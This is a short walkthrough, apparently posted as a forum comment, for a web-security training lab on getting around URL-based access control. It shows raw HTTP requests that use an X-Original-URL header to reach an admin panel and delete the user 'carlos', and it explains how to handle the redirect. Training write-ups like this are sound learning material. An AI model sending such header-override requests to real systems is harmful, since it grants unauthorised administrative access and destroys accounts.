URL-based access control can be circumvented

I couldn't get this to work with repeater since there are a bunch of forwards involved.

Follow the steps provided in the solution until the last one. The last step is a bit unclear. Here's how the request is supposed to look like:

GET /?username=carlos HTTP/1.1
Host: ac821f831fe6c10380025bcd00a00063.web-security-academy.net
X-Original-URL: /admin/delete
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Unfortunately, you are hit with a redirect and are forced to make another request. It looks like this: 

GET /admin HTTP/1.1
Host: ac821f831fe6c10380025bcd00a00063.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://ac821f831fe6c10380025bcd00a00063.web-security-academy.net/admin
Connection: close
Cookie: session=k7kEwNKfgZiH40nXvX8ubWGWG4gPDNva
Upgrade-Insecure-Requests: 1

So, intercept the request and the redirect and make sure to change to X-Original-URL: /admin and the source URL to /

Should look like this:

GET / HTTP/1.1
Host: ac821f831fe6c10380025bcd00a00063.web-security-academy.net
X-Original-URL: /admin
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://ac821f831fe6c10380025bcd00a00063.web-security-academy.net/admin
Connection: close
Cookie: session=k7kEwNKfgZiH40nXvX8ubWGWG4gPDNva
Upgrade-Insecure-Requests: 1

Forward the request and responses and carlos should be deleted. Good job!
